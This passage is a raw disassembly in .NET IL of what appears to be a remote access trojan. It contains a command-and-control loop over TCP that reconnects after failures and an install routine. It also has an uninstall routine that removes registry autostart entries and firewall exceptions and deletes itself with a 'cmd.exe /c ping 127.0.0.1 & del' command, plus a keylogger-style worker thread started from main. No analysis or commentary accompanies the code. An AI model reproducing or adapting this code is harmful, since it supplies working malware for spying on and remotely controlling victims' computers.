        IL_00de:  stsfld     bool ClassLibrary1.OK::Cn
        IL_00e3:  call       string ClassLibrary1.OK::inf()
        IL_00e8:  call       bool ClassLibrary1.OK::Send(string)
        IL_00ed:  pop
        IL_00ee:  ldsfld     bool ClassLibrary1.OK::Cn
        IL_00f3:  brtrue.s   IL_00f9

        IL_00f5:  ldc.i4.0
        IL_00f6:  stloc.0
        IL_00f7:  leave.s    IL_011c

        IL_00f9:  ldc.i4.1
        IL_00fa:  stloc.0
        IL_00fb:  leave.s    IL_011c

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00fd:  dup
        IL_00fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0103:  stloc.s    V_6
        IL_0105:  ldc.i4.0
        IL_0106:  stsfld     bool ClassLibrary1.OK::Cn
        IL_010b:  ldc.i4.0
        IL_010c:  stloc.0
        IL_010d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0112:  leave.s    IL_011c

      }  // end handler
    }  // end .try
    finally
    {
      IL_0114:  ldloc.s    V_7
      IL_0116:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_011b:  endfinally
    }  // end handler
    IL_011c:  ldloc.0
    IL_011d:  ret
  } // end of method OK::connect

  .method public static void  RC() cil managed
  {
    // Code size       477 (0x1dd)
    .maxstack  10
    .locals init (int32 V_0,
             class [mscorlib]System.Array V_1,
             class [mscorlib]System.Threading.Thread V_2,
             int32 V_3,
             class [mscorlib]System.Exception V_4,
             uint8[] V_5,
             object[] V_6,
             object[] V_7)
    IL_0000:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
    IL_0005:  brtrue.s   IL_000c

    IL_0007:  br         IL_01b9

    .try
    {
      IL_000c:  ldsfld     bool ClassLibrary1.OK::Cn
      IL_0011:  brtrue.s   IL_0018

      IL_0013:  leave      IL_01b9

      IL_0018:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
      IL_001d:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0022:  ldc.i4.0
      IL_0023:  cgt.un
      IL_0025:  brfalse    IL_017b

      IL_002a:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
      IL_002f:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0034:  callvirt   instance int32 [System]System.Net.Sockets.Socket::get_Available()
      IL_0039:  ldc.i4.1
      IL_003a:  sub.ovf
      IL_003b:  ldc.i4.1
      IL_003c:  add.ovf
      IL_003d:  newarr     [mscorlib]System.Byte
      IL_0042:  stsfld     uint8[] ClassLibrary1.OK::b
      IL_0047:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
      IL_004c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0051:  ldsfld     uint8[] ClassLibrary1.OK::b
      IL_0056:  ldc.i4.0
      IL_0057:  ldsfld     uint8[] ClassLibrary1.OK::b
      IL_005c:  ldlen
      IL_005d:  conv.ovf.i4
      IL_005e:  ldc.i4.0
      IL_005f:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_0064:  stloc.0
      IL_0065:  ldloc.0
      IL_0066:  ldc.i4.0
      IL_0067:  ble        IL_01a8

      IL_006c:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_0071:  ldsfld     uint8[] ClassLibrary1.OK::b
      IL_0076:  ldc.i4.0
      IL_0077:  ldloc.0
      IL_0078:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_007d:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_0082:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0087:  stloc.s    V_5
      IL_0089:  ldloca.s   V_5
      IL_008b:  call       string ClassLibrary1.OK::BS(uint8[]&)
      IL_0090:  ldsfld     string ClassLibrary1.OK::SPL
      IL_0095:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_009a:  brfalse    IL_019d

      IL_009f:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_00a4:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_00a9:  ldsfld     string ClassLibrary1.OK::SPL
      IL_00ae:  call       class [mscorlib]System.Array ClassLibrary1.OK::fx(uint8[],
                                                                             string)
      IL_00b3:  stloc.1
      IL_00b4:  ldnull
      IL_00b5:  ldftn      void ClassLibrary1.OK::_Lambda$__3(object)
      IL_00bb:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_00c0:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart)
      IL_00c5:  stloc.2
      IL_00c6:  ldloc.2
      IL_00c7:  ldloc.1
      IL_00c8:  ldc.i4.1
      IL_00c9:  newarr     [mscorlib]System.Object
      IL_00ce:  stloc.s    V_6
      IL_00d0:  ldloc.s    V_6
      IL_00d2:  ldc.i4.0
      IL_00d3:  ldc.i4.0
      IL_00d4:  box        [mscorlib]System.Int32
      IL_00d9:  stelem.ref
      IL_00da:  ldloc.s    V_6
      IL_00dc:  ldnull
      IL_00dd:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_00e2:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00e7:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_00ec:  ldloc.2
      IL_00ed:  ldc.i4     0xc8
      IL_00f2:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_00f7:  pop
      IL_00f8:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_00fd:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0102:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0107:  stsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_010c:  ldloc.1
      IL_010d:  callvirt   instance int32 [mscorlib]System.Array::get_Length()
      IL_0112:  ldc.i4.2
      IL_0113:  bne.un.s   IL_0179

      IL_0115:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_011a:  ldloc.1
      IL_011b:  ldc.i4.1
      IL_011c:  newarr     [mscorlib]System.Object
      IL_0121:  stloc.s    V_7
      IL_0123:  ldloc.s    V_7
      IL_0125:  ldc.i4.0
      IL_0126:  ldc.i4.1
      IL_0127:  box        [mscorlib]System.Int32
      IL_012c:  stelem.ref
      IL_012d:  ldloc.s    V_7
      IL_012f:  ldnull
      IL_0130:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_0135:  castclass  uint8[]
      IL_013a:  ldc.i4.0
      IL_013b:  ldloc.1
      IL_013c:  ldc.i4.1
      IL_013d:  newarr     [mscorlib]System.Object
      IL_0142:  stloc.s    V_6
      IL_0144:  ldloc.s    V_6
      IL_0146:  ldc.i4.0
      IL_0147:  ldc.i4.1
      IL_0148:  box        [mscorlib]System.Int32
      IL_014d:  stelem.ref
      IL_014e:  ldloc.s    V_6
      IL_0150:  ldnull
      IL_0151:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_0156:  ldnull
      IL_0157:  ldstr      "length"
      IL_015c:  ldc.i4.0
      IL_015d:  newarr     [mscorlib]System.Object
      IL_0162:  ldnull
      IL_0163:  ldnull
      IL_0164:  ldnull
      IL_0165:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_016a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(object)
      IL_016f:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0174:  br         IL_007d

      IL_0179:  br.s       IL_019d

      IL_017b:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
      IL_0180:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_0185:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_018a:  stloc.3
      IL_018b:  ldloc.3
      IL_018c:  ldc.i4.m1
      IL_018d:  bne.un.s   IL_0191

      IL_018f:  leave.s    IL_01b9

      IL_0191:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_0196:  ldloc.3
      IL_0197:  conv.ovf.u1
      IL_0198:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_019d:  ldc.i4.1
      IL_019e:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_01a3:  br         IL_000c

      IL_01a8:  leave.s    IL_01b9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01aa:  dup
      IL_01ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b0:  stloc.s    V_4
      IL_01b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b7:  leave.s    IL_01b9

    }  // end handler
    IL_01b9:  ldc.i4.0
    IL_01ba:  stsfld     bool ClassLibrary1.OK::Cn
    IL_01bf:  ldc.i4     0x9c4
    IL_01c4:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01c9:  call       bool ClassLibrary1.OK::connect()
    IL_01ce:  brtrue.s   IL_01d2

    IL_01d0:  br.s       IL_01b9

    IL_01d2:  ldc.i4.1
    IL_01d3:  stsfld     bool ClassLibrary1.OK::Cn
    IL_01d8:  br         IL_0000
  } // end of method OK::RC

  .method public static void  UNS() cil managed
  {
    // Code size       337 (0x151)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldc.i4.0
    IL_0001:  call       void ClassLibrary1.OK::pr(int32)
    .try
    {
      IL_0006:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_000b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0010:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0015:  ldsfld     string ClassLibrary1.OK::sf
      IL_001a:  ldc.i4.1
      IL_001b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0020:  ldsfld     string ClassLibrary1.OK::RG
      IL_0025:  ldc.i4.0
      IL_0026:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_002b:  leave.s    IL_003b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002d:  dup
      IL_002e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0033:  stloc.0
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0039:  leave.s    IL_003b

    }  // end handler
    .try
    {
      IL_003b:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0040:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0045:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_004a:  ldsfld     string ClassLibrary1.OK::sf
      IL_004f:  ldc.i4.1
      IL_0050:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0055:  ldsfld     string ClassLibrary1.OK::RG
      IL_005a:  ldc.i4.0
      IL_005b:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0060:  leave.s    IL_0070

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0062:  dup
      IL_0063:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0068:  stloc.1
      IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006e:  leave.s    IL_0070

    }  // end handler
    .try
    {
      IL_0070:  ldstr      "netsh firewall delete allowedprogram \""
      IL_0075:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_007a:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_007f:  ldstr      "\""
      IL_0084:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0089:  ldc.i4.0
      IL_008a:  ldc.i4.0
      IL_008b:  ldc.i4.m1
      IL_008c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0091:  pop
      IL_0092:  leave.s    IL_00a2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0094:  dup
      IL_0095:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_009a:  stloc.2
      IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a0:  leave.s    IL_00a2

    }  // end handler
    .try
    {
      IL_00a2:  ldsfld     class [mscorlib]System.IO.FileStream ClassLibrary1.OK::FS
      IL_00a7:  brfalse.s  IL_00d2

      IL_00a9:  ldsfld     class [mscorlib]System.IO.FileStream ClassLibrary1.OK::FS
      IL_00ae:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_00b3:  ldc.i4.7
      IL_00b4:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_00b9:  ldstr      "\\"
      IL_00be:  ldsfld     string ClassLibrary1.OK::RG
      IL_00c3:  ldstr      ".exe"
      IL_00c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_00cd:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_00d2:  leave.s    IL_00e2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00d4:  dup
      IL_00d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00da:  stloc.3
      IL_00db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e0:  leave.s    IL_00e2

    }  // end handler
    .try
    {
      IL_00e2:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_00e7:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00ec:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_00f1:  ldstr      "Software"
      IL_00f6:  ldc.i4.1
      IL_00f7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_00fc:  ldsfld     string ClassLibrary1.OK::RG
      IL_0101:  ldc.i4.0
      IL_0102:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_0107:  leave.s    IL_0118

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0109:  dup
      IL_010a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_010f:  stloc.s    V_4
      IL_0111:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0116:  leave.s    IL_0118

    }  // end handler
    .try
    {
      IL_0118:  ldstr      "cmd.exe /c ping 127.0.0.1 & del \""
      IL_011d:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_0122:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0127:  ldstr      "\""
      IL_012c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0131:  ldc.i4.0
      IL_0132:  ldc.i4.0
      IL_0133:  ldc.i4.m1
      IL_0134:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0139:  pop
      IL_013a:  leave.s    IL_014b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_013c:  dup
      IL_013d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0142:  stloc.s    V_5
      IL_0144:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0149:  leave.s    IL_014b

    }  // end handler
    IL_014b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0150:  ret
  } // end of method OK::UNS

  .method private specialname static void 
          _Lambda$__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0006:  call       bool ClassLibrary1.OK::Send(string)
    IL_000b:  pop
    IL_000c:  ret
  } // end of method OK::_Lambda$__1

  .method private specialname static void 
          _Lambda$__2(object a0,
                      class [mscorlib]System.EventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void ClassLibrary1.OK::ex()
    IL_0005:  ret
  } // end of method OK::_Lambda$__2

  .method private specialname static void 
          _Lambda$__3(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void ClassLibrary1.OK::Ind(uint8[])
    IL_000b:  ret
  } // end of method OK::_Lambda$__3

} // end of class ClassLibrary1.OK

.class public auto ansi ClassLibrary1.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       876 (0x36c)
    .maxstack  5
    .locals init (int32 V_0,
             string V_1,
             class [mscorlib]System.Threading.Thread V_2,
             string[] V_3,
             class [mscorlib]System.Exception V_4,
             class [System]System.Diagnostics.Process V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             bool V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             string V_17,
             class ClassLibrary1.kl V_18)
    IL_0000:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0005:  brfalse    IL_00d7

    IL_000a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_000f:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0014:  ldc.i4.0
    IL_0015:  ble        IL_00d7

    IL_001a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_001f:  ldstr      ":"
    IL_0024:  ldc.i4.m1
    IL_0025:  ldc.i4.0
    IL_0026:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_002b:  stloc.3
    IL_002c:  ldloc.3
    IL_002d:  ldc.i4.0
    IL_002e:  ldelem.ref
    IL_002f:  stloc.s    V_17
    IL_0031:  ldloc.s    V_17
    IL_0033:  ldstr      "UP"
    IL_0038:  ldc.i4.0
    IL_0039:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_003e:  ldc.i4.0
    IL_003f:  bne.un.s   IL_00bd

    .try
    {
      IL_0041:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0046:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_004b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0050:  ldstr      "di"
      IL_0055:  ldstr      "!"
      IL_005a:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_005f:  leave.s    IL_0070

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0061:  dup
      IL_0062:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0067:  stloc.s    V_4
      IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006e:  leave.s    IL_0070

    }  // end handler
    .try
    {
      IL_0070:  ldloc.3
      IL_0071:  ldc.i4.1
      IL_0072:  ldelem.ref
      IL_0073:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0078:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_007d:  stloc.s    V_5
      IL_007f:  ldloc.s    V_5
      IL_0081:  ldc.i4     0x1388
      IL_0086:  callvirt   instance bool [System]System.Diagnostics.Process::WaitForExit(int32)
      IL_008b:  pop
      .try
      {
        IL_008c:  ldloc.s    V_5
        IL_008e:  callvirt   instance void [System]System.ComponentModel.Component::Dispose()
        IL_0093:  leave.s    IL_00d7

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0095:  dup
        IL_0096:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_009b:  stloc.s    V_6
        IL_009d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00a2:  leave.s    IL_00d7

      }  // end handler
    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a4:  dup
      IL_00a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00aa:  stloc.s    V_7
      IL_00ac:  ldc.i4     0x1388
      IL_00b1:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00bb:  leave.s    IL_00d7

    }  // end handler
    IL_00bd:  ldloc.s    V_17
    IL_00bf:  ldstr      ".."
    IL_00c4:  ldc.i4.0
    IL_00c5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_00ca:  ldc.i4.0
    IL_00cb:  bne.un.s   IL_00d7

    IL_00cd:  ldc.i4     0x1388
    IL_00d2:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    .try
    {
      IL_00d7:  ldsfld     string ClassLibrary1.OK::RG
      IL_00dc:  call       class [mscorlib]System.Threading.Mutex [mscorlib]System.Threading.Mutex::OpenExisting(string)
      IL_00e1:  pop
      IL_00e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_00e7:  leave.s    IL_0116

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00e9:  dup
      IL_00ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ef:  stloc.s    V_9
      IL_00f1:  ldc.i4.0
      IL_00f2:  stloc.s    V_8
      IL_00f4:  ldc.i4.1
      IL_00f5:  ldsfld     string ClassLibrary1.OK::RG
      IL_00fa:  ldloca.s   V_8
      IL_00fc:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                                 string,
                                                                                 bool&)
      IL_0101:  stsfld     class [mscorlib]System.Threading.Mutex ClassLibrary1.OK::MT
      IL_0106:  ldloc.s    V_8
      IL_0108:  brtrue.s   IL_010f

      IL_010a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_010f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0114:  leave.s    IL_0116

    }  // end handler
    IL_0116:  call       void ClassLibrary1.OK::INS()
    IL_011b:  ldnull
    IL_011c:  ldftn      void ClassLibrary1.OK::RC()
    IL_0122:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0127:  ldc.i4.1
    IL_0128:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_012d:  stloc.2
    IL_012e:  ldloc.2
    IL_012f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    .try
    {
      IL_0134:  newobj     instance void ClassLibrary1.kl::.ctor()
      IL_0139:  stsfld     class ClassLibrary1.kl ClassLibrary1.OK::kq
      IL_013e:  ldsfld     class ClassLibrary1.kl ClassLibrary1.OK::kq
      IL_0143:  dup
      IL_0144:  ldvirtftn  instance void ClassLibrary1.kl::WRK()
      IL_014a:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_014f:  ldc.i4.1
      IL_0150:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_0155:  stloc.2
      IL_0156:  ldloc.2
      IL_0157:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_015c:  leave.s    IL_016d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_015e:  dup
